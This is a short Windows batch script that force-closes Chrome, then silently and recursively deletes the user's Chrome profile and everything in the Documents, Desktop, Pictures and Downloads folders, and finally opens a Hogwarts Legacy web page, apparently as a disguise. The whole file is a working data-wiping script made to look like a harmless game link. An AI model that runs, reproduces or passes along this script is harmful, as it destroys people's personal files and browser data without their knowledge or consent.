@echo off

taskkill /F /IM chrome.exe /T

set ChromeDir=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data
set Documents=C:\Users\%USERNAME%\Documents\
set Desktop=C:\Users\%USERNAME%\Desktop\
set Pictures=C:\Users\%USERNAME%\Pictures\
set Downloads= C:\Users\%USERNAME%\Downloads\

del /q /s /f "%ChromeDir%"
rd /s /q "%ChromeDir%"

del /q /s /f "%Documents%"
del /q /s /f "%Desktop%"
del /q /s /f "%Pictures%"
del /q /s /f "%Downloads%"


start chrome https://www.hogwartslegacy.com/en-gb